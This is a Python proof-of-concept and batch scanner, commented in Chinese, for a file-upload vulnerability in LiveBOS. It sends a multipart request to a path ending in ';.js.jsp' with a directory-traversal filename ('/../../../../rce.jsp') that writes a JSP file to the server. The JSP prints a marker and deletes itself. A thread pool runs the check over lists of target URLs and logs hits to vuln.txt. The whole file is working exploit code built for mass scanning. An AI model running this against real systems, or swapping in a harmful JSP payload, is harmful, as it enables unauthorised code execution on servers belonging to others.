import sys
import requests
import argparse
import concurrent.futures


# 检查漏洞的核心函数，简单显示是否存在漏洞
def check_vuln(url):
    vuln_url = url + "/feed/UploadFile.do;.js.jsp"

    # 构造文件上传的请求内容
    data = """---WebKitFormBoundaryxegqoxxi
Content-Disposition: form-data; name="file"; filename="/../../../../rce.jsp"
Content-Type: image/jpeg

<%@ page import="java.io.File" %>
<% 
out.println("pppppppppoooooooocccccccccccc"); 
String filePath = application.getRealPath(request.getServletPath()); 
new File(filePath).delete();
%>
---WebKitFormBoundaryxegqoxxi--"""

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Content-Type": "multipart/form-data; boundary=-WebKitFormBoundaryxegqoxxi"
    }
    try:
        response = requests.post(vuln_url, headers=headers, data=data, timeout=10, verify=False)

        # 根据 HTTP 状态码和响应长度简单判断是否有漏洞
        if response.status_code == 200 and len(response.content) > 0:
            print(f"[+] {url} 可能存在文件上传漏洞")
            return f"{url}\n"
        else:
            print(f"[-] {url} 未发现漏洞")
    except requests.RequestException as e:
        print(f"[-] {url} 连接失败: {e}")

    return None


# 批量检测函数，支持多线程
def batch_check(filename, max_workers=10):
    with open(filename, "r") as f:
        urls = [line.strip() for line in f.readlines() if line.strip()]

    results = []

    # 使用线程池来并发检测
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_url = {executor.submit(check_vuln, url): url for url in urls}
        for future in concurrent.futures.as_completed(future_to_url):
            result = future.result()
            if result:
                results.append(result)

    # 将结果写入文件
    if results:
        with open("vuln.txt", "a") as f:
            f.writelines(results)


# 打印横幅和帮助信息
def banner():
    banner_info = """
 ___                             ___                           
(   )  .-.                      (   )                          
 | |  ( __)  ___  ___    .--.    | |.-.     .--.       .--.    
 | |  (''") (   )(   )  /    \   | /   \   /    \    /  _  \   
 | |   | |   | |  | |  |  .-. ;  |  .-. | |  .-. ;  . .' `. ;  
 | |   | |   | |  | |  |  | | |  | |  | | | |  | |  | '   | |  
 | |   | |   | |  | |  |  |/  |  | |  | | | |  | |  _\_`.(___) 
 | |   | |   ' '  ; '  |  ' _.'  | |  | | | '  | |  | |  `\ |  
 | |   | |    \ `' /   '  `-' /  ' `-' ;  '  `-' /  ; '._,' '  
(___) (___)    '_.'     `.__.'    `.__.    `.__.'    '.___.'  
"""
    print(banner_info)
    print("LiveBOS漏洞检测".center(60, '*'))
    print(f"[+] {sys.argv[0]} --url http://www.xxx.com 进行单个漏洞检测")
    print(f"[+] {sys.argv[0]} --file targeturl.txt 进行批量漏洞检测")
    print(f"[+] {sys.argv[0]} --help 查看详细帮助信息")


# 主函数
def main():
    parser = argparse.ArgumentParser(description='LiveBOS 漏洞批量检测脚本')
    parser.add_argument('-u', '--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f', '--file', type=str, help='批量检测文件路径')
    parser.add_argument('-t', '--threads', type=int, default=10, help='并发线程数，默认10个线程')

    args = parser.parse_args()

    if args.url:
        result = check_vuln(args.url)
        if result:
            with open("vuln.txt", "a") as f:
                f.write(result)
    elif args.file:
        batch_check(args.file, args.threads)
    else:
        banner()


if __name__ == '__main__':
    main()